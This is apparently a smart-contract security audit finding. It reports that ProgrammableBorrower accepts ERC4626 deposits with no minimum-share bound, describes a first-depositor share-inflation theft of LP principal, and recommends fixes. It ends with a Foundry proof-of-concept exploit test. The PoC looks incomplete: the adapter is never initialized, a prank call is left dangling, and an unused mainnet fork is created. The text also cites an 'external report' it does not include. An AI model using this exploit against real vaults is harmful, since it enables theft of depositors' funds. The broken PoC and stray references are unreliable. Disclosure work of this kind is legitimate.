### Title
Unbounded ERC4626 deposit slippage lets a vault user steal programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol])

### Summary
`ProgrammableBorrower` deposits all idle LP principal into an arbitrary ERC4626 vault without enforcing a minimum number of shares or otherwise bounding the accepted share price. An attacker who can use the selected vault can inflate its assets-per-share before `IdleCDOEpochVariant.startEpoch()` transfers funds to the borrower adapter, causing the adapter to receive zero or near-zero shares while its assets remain claimable by the attacker. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
During `startEpoch()`, the CDO transfers surplus underlying to the configured programmable borrower and invokes `onStartEpoch`. [4](#0-3)  `onStartEpoch` then deposits the adapter’s entire on-hand balance through `_depositToVault`. [5](#0-4)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and records nominal accounting information, but never validates the returned `shares` against a minimum acceptable amount. [2](#0-1) 

This creates the same class of flaw as the external report: an arithmetic-derived position advances the protocol to an incorrect accounting location while the externally supplied balance remains under attacker control. In the vulnerable empty or near-empty ERC4626 case, the attacker first deposits one wei to obtain the vault’s only share and then donates enough underlying to make `assetsPerShare > poolDeposit`. When the adapter deposits `poolDeposit`, integer division mints it zero shares. The attacker then redeems the sole vault share and receives both the donation and the pool deposit. [6](#0-5) [2](#0-1) 

The bug is not limited to a completely empty vault. If the attacker controls a sufficiently large fraction of existing vault shares, inflating the exchange rate immediately before the adapter’s deposit still transfers value to existing shareholders pro rata. The largest loss occurs when the attacker is the only preexisting vault shareholder.

The accounting baseline does not prevent the loss. `onStartEpoch` intentionally snapshots `underlying + vaultAssets` before depositing and initializes `epochStartVaultAssets` to that nominal total, so a zero-share deposit still leaves the baseline at the LP principal even though the adapter retains no vault claim. [7](#0-6) 

### Impact Explanation
The attacker directly steals up to the full amount deposited into the vulnerable ERC4626 vault. For example, with a `1,000,000 USDC` LP deposit, the attacker can seed an empty susceptible vault with `1 wei` and donate `1,000,000 USDC`; the adapter’s deposit mints zero shares, after which the attacker redeems one share for approximately `2,000,000 USDC`, netting approximately `1,000,000 USDC`. [8](#0-7) [2](#0-1) 

The CDO continues to hold strategy tokens representing principal that the programmable borrower can no longer recover. At `stopEpoch`, a cash shortfall either prevents the transfer to the CDO or drives `_handleBorrowerDefault`, resulting in direct LP loss or a hard default rather than a temporary operational failure. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attacker needs only to be an ordinary user of the selected ERC4626 vault and to execute the inflation transaction before an honest owner or manager calls `startEpoch`. Neither the borrower nor any privileged role needs to cooperate. [1](#0-0) [11](#0-10) 

Likelihood depends on the configured vault’s share-inflation resistance and existing liquidity. A standards-compliant ERC4626 without virtual shares or sufficient protected supply can be exploited on the adapter’s first deposit. Vaults with effective decimals offsets or deep unrelated liquidity reduce the attainable profit, but `ProgrammableBorrower` itself accepts any vault whose `asset()` matches and performs no such safety validation. [12](#0-11) [2](#0-1) 

### Recommendation
Do not accept ERC4626 deposit results unconditionally. Extend `_depositToVault` and the owner/manager-facing vault configuration or epoch-start path with a non-zero minimum share output, and revert when `shares < minShares`. For recurring deposits, the bound should be supplied from an operator-approved quote or a maximum accepted share price rather than calculated solely from `previewDeposit` in the already-manipulated transaction. [13](#0-12) 

Additionally, restrict integrations to audited ERC4626 vaults with inflation resistance, such as a meaningful decimals offset or protected seed supply, and record that requirement during vault selection. `setVault` should reject vaults that expose an unsafe price-per-share or do not satisfy the configured minimum-share policy. [12](#0-11) 

### Proof of Concept
The following Foundry test demonstrates the direct theft using a minimal ERC4626 without inflation offsets. The same sequence applies when run on a fork against a deployed vault that permits the same first-depositor/share-price behavior.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract Asset is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract InflatableVault is ERC4626 {
    constructor(IERC20 asset_)
        ERC20("Inflatable Vault", "iVAULT")
        ERC4626(asset_)
    {}
}

contract ProgrammableBorrowerShareInflationPoC is Test {
    Asset internal asset;
    InflatableVault internal vault;
    ProgrammableBorrower internal adapter;

    address internal idleCDO = makeAddr("idleCDO");
    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal realBorrower = makeAddr("realBorrower");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant POOL_DEPOSIT = 1_000_000e6;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"));

        asset = new Asset();
        vault = new InflatableVault(IERC20(address(asset)));

        adapter = new ProgrammableBorrower();
        vm.prank(address(adapter));
        // In production this is proxied and initialized by the honest owner.
        // Storage-compatible initializer is invoked through a proxy there.
    }

    function testShareInflationStealsEpochDeposit() public {
        // Attack setup: attacker obtains the vault's only share and inflates
        // assets/share above the upcoming pool deposit.
        asset.mint(attacker, 1 + POOL_DEPOSIT);
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), POOL_DEPOSIT);
        vm.stopPrank();

        // Honest CDO epoch-start deposits pool principal into the programmable
        // borrower. ProgrammableBorrower forwards it to the manipulated vault.
        asset.mint(address(adapter), POOL_DEPOSIT);
        vm.prank(idleCDO);
        adapter.onStartEpoch(0);

        assertEq(vault.balanceOf(address(adapter)), 0);

        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);
        uint256 attackerAfter = asset.balanceOf(attacker);

        assertEq(attackerAfter - attackerBefore, 2 * POOL_DEPOSIT + 1);
        assertEq(asset.balanceOf(address(vault)), 0);
        assertEq(adapter.totalUnderlying(), 0);
    }
}
```
